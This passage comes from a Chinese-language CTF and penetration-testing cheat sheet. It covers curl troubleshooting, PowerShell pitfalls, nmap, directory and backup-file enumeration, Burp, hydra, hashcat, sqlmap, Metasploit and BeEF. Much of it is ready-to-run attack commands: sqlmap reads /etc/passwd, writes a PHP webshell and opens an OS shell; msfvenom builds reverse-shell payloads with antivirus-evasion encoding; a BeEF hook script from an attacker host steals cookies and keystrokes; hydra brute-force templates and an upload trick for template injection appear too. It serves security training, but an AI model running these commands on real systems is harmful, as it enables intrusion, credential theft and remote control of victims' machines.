| `>` | 你**发出去**的东西（请求行 + 请求头） | `> GET / HTTP/1.1`、`> User-Agent: curl/8.5.0` |
| `<` | 服务器**回过来**的东西（状态行 + 响应头） | `< HTTP/1.1 200 OK`、`< Content-Type: text/html` |

正常请求的 -v 长这样（关键行已标注）：
```txt
* Trying 93.184.215.14:80...          ← 找到服务器 IP，开始连
* Connected to example.com ...        ← 连接成功
> GET / HTTP/1.1                      ← 我发：GET 请求
> Host: example.com                   ← 我发：Host 头（服务器靠它认域名）
> User-Agent: curl/8.5.0              ← 我发：UA（暴露是 curl）
>
< HTTP/1.1 200 OK                     ← 服务器回：状态 200
< Content-Type: text/html             ← 服务器回：响应头
< ...（更多响应头）
<
<!doctype html>...                    ← 响应体（正文）
```
预期结果：你能说出「哪行是我发的、哪行是服务器回的」。
如果不行：输出只有 `*` 没有 `>` 和 `<` → 根本没连上服务器，看第 4 步的报错表。

> [!tip] 读 -v 的三个高频用途：1) 看状态行确认请求成功了没；2) 看请求头确认你发的头对不对（比如 Cookie 有没有带上）；3) 看服务器响应头里的技术栈（Server/X-Powered-By）。

#### 第 2 步：从 -v 里读重定向和 Cookie
```bash
curl -v http://target/login   # 不加 -L 看它跳不跳
```
预期结果：如果服务器要重定向，-v 里会出现：
```txt
< HTTP/1.1 302 Found
< Location: http://target/dashboard
```
意思是：服务器说「去 `/dashboard`」，而你没加 `-L` 所以 curl 不会跟。看到 `302` + `Location` 就知道「这里会跳转」，需要加 `-L`。
如果不行：没有 Location 行 → 没发生重定向，是别的原因（403/404）。

再看 Cookie：服务器给你发 `Set-Cookie` 时：
```txt
< Set-Cookie: PHPSESSID=abc123; path=/
```
这就是登录成功的标志——`-c 文件` 会把它存下来，`-b 文件` 会把它发回去（见第 3 课）。

#### 第 3 步：-w 格式化输出（精确取数）
`-w "格式"` 在请求结束后按格式打印一段信息，格式里用 `%{变量}` 取数据。最常用的组合：
```bash
# 只要状态码
curl -s -o /dev/null -w "%{http_code}\n" http://target/
# 状态码 + 总耗时 + 下载大小（盲注计时、判断响应用）
curl -s -o /dev/null -w "code=%{http_code} time=%{time_total}s size=%{size_download}\n" http://target/
# 看最终落在哪个 URL（重定向终点）
curl -sL -o /dev/null -w "%{url_effective}\n" http://target/login
```
| 变量 | 含义 | 典型用途 |
|---|---|---|
| `%{http_code}` | 状态码（200/302/404…） | 判断请求成功与否 |
| `%{time_total}` | 总耗时（秒） | 时间盲注计时 |
| `%{size_download}` | 下载字节数 | 判断响应是否异常地大/小 |
| `%{url_effective}` | 最终实际访问的 URL | 看重定向终点 |
| `%{redirect_url}` | 重定向指向的 URL | 配合 -L 前的判断 |

`\n` 表示换行（curl 自己会解析），不写的话输出会黏在一起。
预期结果：终端打印 `200` 或 `code=200 time=0.05s size=1256` 这样的结果。
如果不行：输出了 `%{http_code}` 字面量 → 拼写/引号问题，确认 `%{...}` 在 `-w "..."` 里、变量名拼对（http_code 不是 httpcode）。

#### 第 4 步：常见报错速查表
curl 报错都带编号，看到编号查表：
| 报错 | 意思 | 解决 |
|---|---|---|
| `(6) Could not resolve host` | 域名解析失败 | 域名拼写、DNS、网络 |
| `(7) Failed to connect` | 连不上服务器（端口没开/IP 不对） | 确认靶机状态、端口、地址 |
| `(28) Operation timed out` | 请求超时（目标不响应/太慢） | 加 `-m` 限制；确认目标可达；可能被 WAF 拖时间 |
| `(35) SSL connect error` | TLS 握手失败（证书/协议不匹配） | `-k`；`--tlsv1.2`；换 http |
| `(60) SSL certificate problem` | 证书不受信任（自签名/过期） | `-k` 跳过验证（靶机常见） |
| `(22) HTTP page not retrieved` | HTTP 层错误（4xx/5xx 被当成错误） | 看状态码：404 路径错，403 权限/拦截，500 服务端炸 |
| `(18) Partial file` | 下载中断（传输被切断） | 重试；`-C -` 断点续传 |
| `(52) Empty reply from server` | 服务器连接被关闭没回内容 | 确认服务正常；协议对不对（http vs https） |
| `(51) SSL peer certificate ...` | 同 60，证书问题 | `-k` |
| `(56) Recv failure` | 连接被重置/中断 | 服务器主动断连；换参数重试 |

快速判断口诀：
1. 带 `SSL`/`certificate` 的 → 加 `-k`。
2. 带 `resolve`/`connect` 的 → 地址或网络问题。
3. 带 `timed out` 的 → 目标慢/不可达，加 `-m` 防卡，先确认可达。
4. `22`/HTTP 数字 → 服务器已经理你了，看状态码本身。

#### 第 5 步：代理与网络排查
```bash
# 看请求到底走了哪（-v 第一行 * Trying 后面的 IP）
curl -v http://target/

# 挂代理（Burp/mitmproxy）
curl -sk -x http://127.0.0.1:8080 http://target/

# 指定解析（绕过 DNS，直连 IP）
curl -sk --resolve target:80:127.0.0.1 http://target/
```
预期结果：`-v` 显示连接的目标 IP；挂代理后代理软件能看到流量。
如果不行：挂代理反而报错 → 代理地址端口对不对；https 目标过代理要 `-k` 或信任代理 CA。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `-v` 输出乱码 | 服务器返回二进制 | 正常，`-v` 关注头，别盯着体 |
| 加了 `-k` 还报 SSL | TLS 版本太老/太新 | `--tlsv1.2` / `--tlsv1.3` 指定版本 |
| `-w` 不换行 | 忘写 `\n` | `-w "%{http_code}\n"` |
| 代理后全 502 | 代理本身问题 | 检查代理软件；确认没配错端口 |
| 一会儿通一会儿不通 | 网络抖动/限速 | 加 `--retry 3` 自动重试 |

#### 实战要点
- **遇到问题先 `-v` 再看报错编号**：编号告诉你「哪一层」出了问题（DNS/连接/TLS/HTTP），方向对了解决就快。
- `-w` 是盲注和状态判断的神器，务必会写 `-w "%{http_code}\n"` 和 `-w "%{time_total}\n"` 这两句。
- 报错编号不用背，知道「查表」这件事本身就能省你大量时间。
- 本课 + 前 4 课 = curl 完整技能包：装好 → 会参数 → 会提交 → 会实战 → 会排错。

### [curl-06-windows] 第 6 课：Windows/PowerShell 实战排坑 + 两个必背参数 | easy | curl;windows;powershell;path-as-is;data-binary;排坑 | curl windows;powershell curl;--path-as-is;path-as-is;curl 引号;data-binary
> 实战里 80% 的"照抄了却不行"出在 Windows/PowerShell 环境而不是题目本身：引号被吃、BOM 破坏 JSON、目录没权限。本课把 Windows 上发请求的所有坑一次排干净，并讲透两个 CTF 高频但教材很少提的参数。
#### 为什么 Windows 上这么容易翻车
Windows 的 PowerShell 不是 bash，它对引号、编码、命令别名的处理和 Linux 完全不同。打靶时同一套命令在 Linux 上能跑、Windows 上就报错，十有八九是下面四个坑之一。
#### 坑 1：PowerShell 里 curl 是假的（是 Invoke-WebRequest 的别名）
```powershell
curl http://target/      # PowerShell 里这个 curl 是 Invoke-WebRequest，语法完全不同！
curl.exe http://target/  # 加 .exe 才是真 curl
```
打靶命令一律写 `curl.exe`，否则 `-X`、`-d` 这些参数全不认。
#### 坑 2：内联 JSON 会被吃引号（-d 的经典翻车）
```powershell
# 这样发 JSON 大概率失败：PowerShell 会把双引号吞掉，服务器收到 {content:...} 解析报 400
curl.exe -X POST http://target/ -H "Content-Type: application/json" -d '{"content":"abc"}'
```
解法：把 JSON 写进文件，让 curl 读文件，绕开一切引号问题：
```powershell
$json = '{"content":"abc"}'
Set-Content -Path body.json -Value $json -Encoding ascii   # 注意 ascii：无 BOM
curl.exe -X POST http://target/ -H "Content-Type: application/json" --data-binary "@body.json"
```
> [!warn] 编码必须 `-Encoding ascii`（或用 `[System.IO.File]::WriteAllText("$PWD\body.json", $json)`）。PowerShell 5.1 的 `-Encoding utf8` 会写 BOM，BOM 粘在 JSON 开头，服务器 JSON.parse 直接 400。
#### 坑 3：管理员 PowerShell 默认目录是 system32，写文件被拒
管理员模式打开 PowerShell 默认在 `C:\WINDOWS\system32`，往那里写文件报"访问被拒绝"。先 `cd $HOME`（回到 C:\Users\你）再写文件。
#### 坑 4：--data-binary "@文件" 是什么
- `--data-binary`：发数据，且一字不差（不像 `-d` 会把换行/空格当分隔符处理）
- `@文件名`：表示"去读这个文件的内容"，不是发字面 "@body.json"
连起来 `--data-binary "@body.json"` = "把 body.json 的内容原封不动当请求体发出去"。这是 Windows 上发 JSON 最稳的方式。
#### 重点参数：--path-as-is（URL 规范化陷阱）
curl 默认会把 URL 里的 `/.`、`/../` 等"多余片段"自己折叠掉再发（libcurl 标准行为）。但 CTF 里这类字符常常就是绕过过滤的关键：
```powershell
curl.exe --path-as-is -X PUT "http://target/views/x.ejs/." ...   # 原样发送 /views/x.ejs/.
```
不加 `--path-as-is`，curl 会把 `/views/x.ejs/.` 折叠成 `/views/x.ejs/`，绕过直接失效。**凡是 payload 里带 `/.` 或 `..` 且需要原样发送的，一律加 `--path-as-is`**。
> [!tip] 判断 curl 有没有折叠 URL：加 `-v`，看 `> PUT /views/x.ejs/. HTTP/1.1` 这一行实际发出去的路径是什么。
#### PowerShell 全家桶的选择（各有什么坑）
| 工具 | 会不会折叠 `/.` | 引号问题 | 结论 |
|---|---|---|---|
| curl.exe + --data-binary @文件 | 会，--path-as-is 可关 | 无（读文件） | ✅ 首选 |
| curl.exe + -d 内联 | 会，--path-as-is 可关 | 会吃引号 | ❌ 别用 |
| Invoke-RestMethod / Invoke-WebRequest | 会折叠且无法关闭 | 无 | ❌ 含 `/.` 的绕过用不了 |
| Burp / Postman | 不折叠 | 无 | ✅ 图形界面备选 |
#### 一套能直接抄的 Windows 发 JSON 模板
```powershell
cd $HOME
$json = '{"content":"你要发的内容"}'
Set-Content -Path body.json -Value $json -Encoding ascii
curl.exe --path-as-is -X PUT "http://目标/views/文件名.ejs/." -H "Content-Type: application/json" --data-binary "@body.json"
curl.exe "http://目标/?templ=文件名"
```
> [!warn] 上传类题目返回 "File already exists"：服务器不允许覆盖已有文件，把文件名换一个（x.ejs → y.ejs），上传和触发两处一起改。
#### 状态码速查（PUT 上传场景）
| 状态码 | 含义 | 下一步 |
|---|---|---|
| 201 / "File created" | 写入成功 | 去触发/访问它 |
| 403 "Denied" | 被过滤拦 | 检查 --path-as-is、路径里的特殊字符 |
| 500 + Buffer 报错 | 服务器没收到内容 | body.json 空？-H 没写？cd $HOME 了吗 |
| 500 + "File already exists" | 文件名用过了 | 换文件名 |

## [g-scan] 扫描与指纹识别——端口、版本与站点指纹，信息收集第一步
### [nmap-basic] Nmap 参数全集 | easy | nmap;scan;port;service | nmap;端口扫描;服务探测
> Nmap 是最常用的端口扫描与主机发现工具，掌握核心参数即可覆盖信息收集阶段九成需求。

#### 常用参数

| 参数 | 作用 |
|---|---|
| -sS | SYN 半开扫描，需 root，快且隐蔽 |
| -sT | TCP connect 全连接扫描，无需 root |
| -sU | UDP 扫描，较慢，配合 -p 指定端口 |
| -sV | 服务版本探测 |
| -sC | 加载默认 NSE 安全脚本 |
| -A | 等于 -sV -sC -O --traceroute，全面探测 |
| -O | 操作系统指纹 |
| -p- | 扫描全部 65535 端口 |
| -p 80,443 | 指定端口，可用 -p 1-1000 范围 |
| --top-ports 100 | 只扫最常见的前 100 端口 |
| -T0 至 -T5 | 时序模板，T4 较快，T0 极慢免扰 |
| -Pn | 跳过主机发现直接扫端口 |
| -n | 不做 DNS 反向解析，加快速度 |
| -sn | 仅主机发现（ping 扫描），不扫端口 |
| -oN out.txt | 普通文本输出 |
| -oA out | 同时输出 normal/greppable/xml 三种格式 |
| -iL list.txt | 从文件读入目标列表 |
| --script=vuln | 运行漏洞检测脚本 |
| --open | 只显示 open 状态端口 |

#### 典型命令

```bash
nmap -sV -sC -p- -T4 -oN scan.txt 192.168.1.10     # 全面扫描，最常用组合
nmap -sS -sV -p 1-10000 --open 10.10.10.0/24       # 网段常见端口与版本
nmap -p 80,443 --script=http-title 192.168.1.10    # 批量抓网站标题
nmap -sU --top-ports 50 192.168.1.10               # 常见 UDP 端口
```

> [!tip] 先快后慢：先用 `-T4 --top-ports 1000` 快速摸底，再对开放端口做 `-sV -sC` 精确探测，避免一上来 -p- 全扫浪费时间。

> [!warn] -A 与 -p- 组合在公网大范围扫描时很慢且易触发告警，注意目标授权与扫描节奏。

### [port-services] 常见端口与服务对照 | easy | port;service;mapping | 端口对照;服务识别
> 端口对应服务是信息收集起点，命中 Redis、Elasticsearch、MongoDB 等往往直接指向未授权访问入口。

| 端口 | 服务 | 常见风险点 |
|---|---|---|
| 21 | FTP | 匿名登录、弱口令、vsftpd 后门 |
| 22 | SSH | 弱口令、用户枚举、SSH 隧道 |
| 23 | Telnet | 明文传输、弱口令 |
| 25 | SMTP | 邮件用户枚举、开放中继 |
| 53 | DNS | 区域传送（AXFR）泄露 |
| 80 | HTTP | 常规 Web 攻击面 |
| 135 | MSRPC | MS17-010 等 RPC 漏洞 |
| 139/445 | NetBIOS/SMB | MS17-010、SMBGhost、共享枚举 |
| 443 | HTTPS | 加密 Web 攻击面 |
| 873 | rsync | 未授权访问、任意文件读取 |
| 1433 | MSSQL | sa 弱口令、xp_cmdshell |
| 1521 | Oracle | 弱口令、TNS 漏洞 |
| 2181 | ZooKeeper | 未授权访问 |
| 3306 | MySQL | root 弱口令、udf 提权 |
| 3389 | RDP | 弱口令、BlueKeep |
| 5432 | PostgreSQL | 弱口令、命令执行 |
| 5601 | Kibana | 未授权访问 |
| 6379 | Redis | 未授权、写公钥/计划任务 getshell |
| 7001 | WebLogic | 反序列化、SSRF |
| 8080 | HTTP 代理/Web | 代理滥用、Web 攻击面 |
| 8443 | HTTPS 备用 | Web 攻击面 |
| 8888 | 宝塔面板 | 弱口令、未授权 |
| 9000 | PHP-FPM/Portainer | FastCGI 未授权执行 |
| 9090 | 管理面板 | 弱口令 |
| 9200 | Elasticsearch | 未授权访问、数据泄露 |
| 11211 | Memcached | 未授权、DRDoS 反射 |
| 27017 | MongoDB | 未授权访问、数据泄露 |

> [!tip] 不认识的端口先用 `nmap -sV` 拿版本，再查对应版本历史漏洞；未授权类漏洞优先手动验证。

### [fingerprint] Web 指纹识别三件套 | easy | fingerprint;wappalyzer;whatweb;nikto | 指纹识别;whatweb;nikto
> 指纹识别确定站点框架与中间件版本，是选 exploit 的前提，版本对应关系要人工核对。

- Wappalyzer：浏览器扩展，打开页面即显示框架、服务器、JS 库技术栈，一键导出。
- WhatWeb：命令行指纹工具。

```bash
whatweb http://target.com              # 单目标
whatweb -a 3 http://target.com         # 激进模式，探测更多特征
whatweb http://target.com/path/        # 可扫子目录
```

- Nikto：Web 服务器漏洞扫描。

```bash
nikto -h http://target.com             # 基础扫描
nikto -h http://target.com -p 8080     # 指定端口
nikto -h http://target.com -o out.html # 输出报告
```

补充：httpx 批量探活加指纹，适合资产多的情况。

> [!warn] Nikto 误报率高，结果需人工复核；指纹版本号要回官方文档确认漏洞利用条件，别拿过期 exp 硬套。

## [g-dir] 目录与资源枚举——找后台、找备份、找接口
### [dir-search] 目录扫描三件套模板 | easy | dirsearch;ffuf;gobuster;dir | 目录扫描;ffuf;gobuster
> 目录枚举寻找隐藏后台、备份文件与接口，三款工具命令结构相似，选一款熟练即可，重点是字典。

```bash
# dirsearch：功能全面，内置状态码过滤
dirsearch -u http://target.com -e php,html,txt -x 403,404 -t 50 --random-agent -o result.txt

# ffuf：速度最快，适合大字典
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,401,403 -t 100

# gobuster：轻量稳定
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x php,bak,txt,zip -t 50
```

#### 参数速查

| 工具 | 常用参数 |
|---|---|
| dirsearch | -e 扩展名、-x 过滤状态码、-t 线程、-r 递归、-w 自定义字典 |
| ffuf | FUZZ 占位符、-mc 匹配状态码、-fc 过滤状态码、-w 字典、-t 线程 |
| gobuster | -u URL、-w 字典、-x 扩展名、-t 线程、-k 忽略证书 |

> [!tip] ffuf 支持多占位符组合：`ffuf -u http://host/FUZZ?key=KEY -w dict1:FUZZ -w dict2:KEY`。

> [!warn] 目录扫描会留下大量访问日志，敏感目标注意 --random-agent、限速与授权。

### [wordlist-keys] 字典要点与词表分类 | easy | wordlist;dictionary;backup;api | 字典;词表
> 字典质量决定枚举效果，通用大字典命中率低，按功能分类的组合词表才有效。

| 分类 | 关键词示例 |
|---|---|
| 后台管理 | admin, manage, manager, system, console, backend, dashboard, control |
| 上传下载 | upload, uploads, file, files, download, attachments, static, media |
| 备份 | backup, bak, old, temp, test, www.zip, site.zip, data.zip |
| 接口类 | api, v1, v2, swagger, graphql, openapi, docs, endpoints, json |
| 源码泄露 | .git, .svn, .hg, .env, .DS_Store, config, phpinfo |
| 常见脚本 | index, login, register, user, users, install, setup |
| 运维 | status, health, metrics, monitor, debug, phpmyadmin, jenkins |

组合策略：
- 后台：admin 加常见后台词表。
- 备份：站点根目录直接扫常见备份文件名。
- 接口：api 加 v1/v2 加 swagger 文档名。

> [!tip] 先用小字典（dirb common、SecLists common.txt）快扫，再针对发现的目录做递归与自定义组合扫描。

### [backup-files] 常见备份与敏感文件清单 | easy | backup;leak;source | 备份文件;源码泄露
> 备份与敏感文件是信息收集捷径，命中一个就可能直接拿到源码或配置。

```txt
# 压缩包备份
www.zip  web.zip  site.zip  backup.zip  bak.zip  data.zip  code.zip  html.zip
1.zip  2.zip  test.zip  temp.zip  old.zip  wwwroot.zip  www.rar  site.rar

# 数据库备份
db.sql  database.sql  data.sql  dump.sql  backup.sql  mysql.sql  sql.zip

# 源码与配置泄露
index.php.bak  index.php~  index.php.swp  config.php.bak  .env
web.config  .git/config  .svn/entries  .DS_Store  phpinfo.php  test.php
id_rsa  id_dsa  authorized_keys  .bash_history  .mysql_history

# 编辑器残留
.vscode/  .idea/  *.swp  *.swo  *.~  *~
```

> [!tip] 备份文件常以站点名、域名命名，扫描时把目标域名和站点目录名加进字典。

> [!danger] 拿到 .git 或 .env 属于严重信息泄露，可作为独立漏洞上报，也是后续 getshell 的跳板。

## [g-proxy] 代理与流量——抓包、改包、看流量
### [burp-workflow] Burp Suite 模块用途与流程 | medium | burp;proxy;repeater;intruder | burp;抓包;重放
> Burp 是 Web 测试核心工具，掌握各模块定位即可高效完成拦截改包、重放、爆破与编解码。

流程：浏览器挂代理 127.0.0.1:8080，安装 CA 证书，Proxy 抓包，请求右键 Send to Repeater/Intruder。

| 模块 | 用途 |
|---|---|
| Proxy | 拦截与转发请求，抓包和手动改包 |
| Target | 站点地图，梳理攻击面 |
| Repeater | 手动重放与修改单个请求 |
| Intruder | 自动化爆破与 fuzz（四种攻击模式） |
| Decoder | 编解码与哈希（Base64/URL/Hex 等） |
| Comparer | 对比两个响应差异，定位注入点 |
| Sequencer | 分析 Token 随机性 |
| Extender | 加载 BApp 扩展 |

常用操作：
1. 开启拦截：Proxy -> Intercept -> Intercept is on。
2. 设范围：Target -> Scope 配置，过滤无关流量。
3. 重放：请求右键 Send to Repeater，改参数观察响应。
4. 爆破：选中参数 Add to Intruder，选模式与字典。
5. 编解码：Decoder 粘贴内容自动识别，或手动选编码。

> [!tip] HTTPS 站点需先在浏览器导入 Burp CA 证书，否则流量无法解密。

> [!warn] 社区版 Intruder 功能受限，Payload 过大时改用 ffuf 或脚本。

### [mitmproxy] mitmproxy 命令速查 | easy | mitmproxy;proxy;mitmdump | mitmproxy;中间人
> 命令行代理工具，适合脚本化与自动化场景，与 Burp 互补。

```bash
mitmproxy -p 8080                        # 交互式界面
mitmdump -p 8080                         # 命令行模式，可配脚本
mitmweb -p 8081                          # Web 界面
mitmdump -p 8080 -w flows.log            # 保存流量
mitmdump -p 8080 -r flows.log            # 回放已保存流量
mitmdump -p 8080 -s addon.py             # 加载 Python 脚本
```

交互界面常用过滤：

| 表达式 | 含义 |
|---|---|
| ~u login | URL 包含 login |
| ~m POST | 只看 POST |
| ~q / ~s | 请求 / 响应 |
| ~d google | 域名包含 google |

> [!tip] mitmdump 配 Python 脚本可实现自动改包、自动提取 Token、批量加 header，比 Burp 更适合长时间挂机任务。

### [tcpdump] tcpdump 抓包速查 | easy | tcpdump;capture;pcap | 抓包;流量分析
> 服务器端抓包利器，配合 Wireshark 分析 pcap，适合排查反弹 shell 与内网流量。

```bash
tcpdump -i eth0                          # 抓取 eth0 全部流量
tcpdump -i any                           # 所有网卡
tcpdump -i eth0 host 1.2.3.4             # 指定主机
tcpdump -i eth0 port 80                  # 指定端口
tcpdump -i eth0 tcp                      # 只看 TCP
tcpdump -i eth0 'tcp port 80 or udp port 53'
tcpdump -i eth0 -w cap.pcap              # 写入文件
tcpdump -r cap.pcap                      # 读取文件
tcpdump -i eth0 -c 100                   # 抓 100 个包后停止
tcpdump -i eth0 -n                       # 不做域名解析
tcpdump -i eth0 -A                       # ASCII 显示载荷
tcpdump -i eth0 -X                       # hex 加 ASCII 显示
```

> [!tip] 排查反弹 shell 时全量抓包后找陌生外连 IP，或抓 SYN 包 `tcpdump -i eth0 -n 'tcp[13] & 2 != 0'`。

> [!warn] 抓包需 root 权限；生产环境注意 -w 磁盘占用，用 -c 或 timeout 限制时长。

## [g-brute] 爆破与口令——在线爆破、哈希破解、组合策略
### [hydra] Hydra 在线爆破模板 | easy | hydra;brute;ssh;ftp;http | hydra;爆破
> Hydra 支持数十种协议在线爆破，模板化使用即可覆盖 SSH、FTP、Web 登录等场景。

```bash
# SSH
hydra -L users.txt -P pass.txt ssh://192.168.1.10

# FTP
hydra -l admin -P pass.txt ftp://192.168.1.10

# HTTP POST 表单（需定位失败关键字 F=）
hydra -l admin -P pass.txt 192.168.1.10 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# 常用全局参数
hydra -L users.txt -P pass.txt -t 16 -f -o ok.txt ssh://192.168.1.10
```

| 参数 | 作用 |
|---|---|
| -l 用户名 | 固定用户名 |
| -L 用户字典 | 用户名列表 |
| -p 密码 | 固定密码 |
| -P 密码字典 | 密码列表 |
| -t 并发 | 线程数 |
| -f | 命中第一个即停止 |
| -o 文件 | 保存结果 |
| -V | 显示每次尝试 |
| -s 端口 | 指定端口 |
| -w 秒 | 超时时间 |

http-post-form 语法为 `路径:POST体(用^USER^/^PASS^占位):失败标志`，失败标志也可用 `S=成功标志` 反向匹配。

> [!warn] 爆破属高风险操作，务必确认授权；-t 过高会打爆目标或被封 IP，配合代理或限速。

### [hashcat] Hashcat 模式与字典路径 | medium | hashcat;hash;crack | hashcat;密码破解
> Hashcat 用 GPU 高速破解哈希，选对 hash 模式是关键，字典与掩码配合使用。

常用模式：

| 模式 | 算法 |
|---|---|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1400 | SHA256 |
| 1800 | sha512crypt($6$) |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 |
| 13100 | Kerberoast(TGS-REP) |
| 22000 | WPA-PBKDF2-PMKID+EAPOL |

```bash
hashcat -m 0 -a 0 hash.txt rockyou.txt             # MD5 字典攻击
hashcat -m 0 -a 3 hash.txt '?d?d?d?d?d?d'          # 6 位纯数字掩码
hashcat -m 1000 -a 1 hash.txt d1.txt d2.txt        # 字典组合
hashcat -m 0 hash.txt --show                       # 显示已破解
hashcat -m 0 -a 0 hash.txt dict.txt -r rule.rule   # 规则变形
```

掩码字符：?l 小写、?u 大写、?d 数字、?s 特殊符号、?a 全字符、?h 十六进制小写。

常用字典路径：

```txt
/usr/share/wordlists/rockyou.txt                          # 经典大字典，需 gunzip 解压
/usr/share/seclists/Passwords/                            # SecLists 密码全集
/usr/share/seclists/Passwords/Common-Credentials/
/usr/share/seclists/Passwords/Default-Credentials/        # 设备默认口令
/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt
```

> [!tip] 常见弱口令组合：admin/admin、root/root、admin/123456、admin/admin888、password、厂商默认口令如 admin/Admin@123。

> [!warn] hashcat 需 GPU 或高性能 CPU；先 `hashcat --identify` 确认哈希类型，参数错会直接报错退出。

### [burp-intruder] Intruder 四种攻击模式 | easy | burp;intruder;fuzz | intruder;爆破模式
> Intruder 的四种模式解决不同爆破场景，选错模式会直接导致结果无效。

| 模式 | 说明 | 适用场景 |
|---|---|---|
| Sniper 狙击手 | 单 payload 位置，逐一替换每个位置 | 单参数爆破 |
| Battering ram 攻城锤 | 所有位置共用同一个 payload 值 | 用户名密码相同的场景 |
| Pitchfork 草叉 | 多 payload 集按行一一对应 | 用户-密码配对字典 |
| Cluster bomb 集束炸弹 | 多 payload 集笛卡尔积全组合 | 用户名密码全组合 |

操作要点：
1. 选中要爆破的参数，Add to Intruder。
2. Positions 页确认攻击位置与模式。
3. Payloads 页配置字典、编码、处理规则。
4. Options 页设置线程、重试与 grep 匹配。
5. 攻击后按响应长度或状态码排序，找异常项。

> [!tip] 登录爆破优先 Pitchfork 用 seclists 的 top-usernames 加 top-passwords 配对字典，比全组合快得多。

> [!warn] 社区版 Intruder 有速率限制，高并发先确认目标能承受，配合 Throttle 限速。

## [g-exp] 漏洞利用框架——注入、漏洞利用与浏览器攻击
### [sqlmap] SQLMap 参数速查 | easy | sqlmap;sql;injection | sqlmap;注入
> SQLMap 是 SQL 注入自动化之王，从检测到脱库到 getshell 一条龙，重点是参数组合。

```bash
# 基础检测
sqlmap -u "http://target.com/item.php?id=1" --batch

# 从 Burp 请求文件读取目标
sqlmap -r request.txt --batch

# 列库/表/字段/数据
sqlmap -u "..." --dbs
sqlmap -u "..." -D dbname --tables
sqlmap -u "..." -D dbname -T tablename --columns
sqlmap -u "..." -D dbname -T tablename -C col1,col2 --dump

# 当前库/用户/权限
sqlmap -u "..." --current-db --current-user --is-dba

# 文件操作
sqlmap -u "..." --file-read=/etc/passwd
sqlmap -u "..." --file-write=shell.php --file-dest=/var/www/html/shell.php

# 命令执行
sqlmap -u "..." --os-shell
sqlmap -u "..." --os-cmd=id

# 进阶
sqlmap -u "..." --level 3 --risk 2 --threads 5
sqlmap -u "..." --cookie "session=xxx" --proxy "http://127.0.0.1:8080" --tamper=space2comment
sqlmap -u "..." -p id --dbms=mysql --time-sec 5
```

| 参数 | 作用 |
|---|---|
| -u / -r | URL 目标 / 请求文件目标 |
| --batch | 全部默认选项，非交互 |
| --dbs / -D / -T / -C | 库/表/列层级枚举 |
| --dump | 导出数据 |
| --os-shell | 数据库命令执行（需高权限加 FILE） |
| --level / --risk | 测试深度与风险等级 |
| --threads | 并发线程 |
| --tamper | 绕过 WAF 的变形脚本 |
| --time-sec | 时间盲注延迟秒数 |

> [!tip] 授权渗透用 --batch 避免交互卡死；--os-shell 失败先查 --is-dba 与 secure_file_priv。

> [!warn] --dump 大数据量非常慢且流量特征明显，先 --count 评估数据量再决定是否全量导出。

### [metasploit] Metasploit 流程与 msfvenom | medium | metasploit;msfvenom;payload | msf;msfconsole
> Metasploit 集成漏洞利用、后渗透与 payload 生成，流程固定：搜索、选用、配置、执行。

基础流程：

```bash
msfconsole                              # 进入控制台
search vsftpd                           # 搜索模块
search type:exploit platform:linux      # 按类型/平台过滤
use exploit/unix/ftp/vsftpd_234_backdoor
info                                    # 查看模块信息
show options                            # 查看必填参数
set RHOSTS 192.168.1.10
set RPORT 21
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run                                     # 或 exploit
sessions -l                             # 列出会话
sessions -i 1                           # 进入会话
background                              # 会话挂后台
```

msfvenom payload 生成：

```bash
# Windows exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f exe -o shell.exe
# Linux elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f elf -o shell
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f raw -o shell.php
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -o shell.py
# 编码尝试免杀
msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe
```

监听：`use exploit/multi/handler` 加 `set PAYLOAD windows/meterpreter/reverse_tcp` 加 `set LHOST/LPORT` 加 `run`。

> [!tip] 反弹后先 getuid、sysinfo、shell 进交互式命令；meterpreter 会话比普通 shell 功能全。

> [!warn] msfvenom 默认 payload 基本被杀软查杀，免杀需配合编码或分离加载，生产环境慎用。

### [beef] BeEF 浏览器利用框架 | medium | beef;xss;browser | beef;浏览器攻击
> BeEF 专注浏览器端攻击，配合存储型 XSS 挂 hook 后即可对受害者浏览器执行模块化利用。

核心原理：在目标页面注入 `<script src="http://attacker:3000/hook.js"></script>`，受害者访问后浏览器被 hook，进入 BeEF 控制台。

常用模块：

| 类别 | 例子 |
|---|---|
| 信息收集 | 获取 Cookie、浏览器指纹、屏幕截图、键盘记录 |
| 探测 | 内网 IP 探测、浏览器代打端口扫描 |
| 利用 | 钓鱼表单、剪贴板劫持 |
| 持久化 | 重定向、iframes、弹窗维持 |

> [!tip] 典型玩法：留言板存 XSS 让管理员访问，hook 后偷 Cookie 或抓后台操作，配合隧道功能做内网渗透。

> [!warn] BeEF 需受害者在线且页面保持打开，属交互式攻击场景受限；hook 代码会被 WAF 拦截，注意混淆。

## [g-fore] 取证与解码——编解码、隐写、流量分析
### [cyberchef] CyberChef 常用配方 | easy | cyberchef;decode;encode | cyberchef;编码解码
> 网络版瑞士军刀，可视化拖拽编解码，从 Base64 到 XOR 爆破一条龙。

常用配方（左侧搜索拖入 Recipe 区）：

| 配方 | 用途 |
|---|---|
| Magic | 自动识别编码并解码，第一步首选 |
| From Base64 | Base64 解码 |
| From Hex | Hex 转字符串 |
| URL Decode | URL 解码 |
| From CharCode | 字符编码数组转文本 |
| ROT13 / Caesar Brute Force | 凯撒爆破 |
| XOR Brute Force | 单字节 XOR 爆破，CTF 高频 |
| Gunzip / From Gzip | 压缩数据解压 |
| Extract Files | 从文件或流量提取内嵌文件 |
| Entropy / Frequency | 熵与频率分析，判断是否加密 |

典型流程：
1. 粘贴密文，先 Magic 自动解码。
2. 多层编码：Base64 到 Hex 到 ROT13 循环解码。
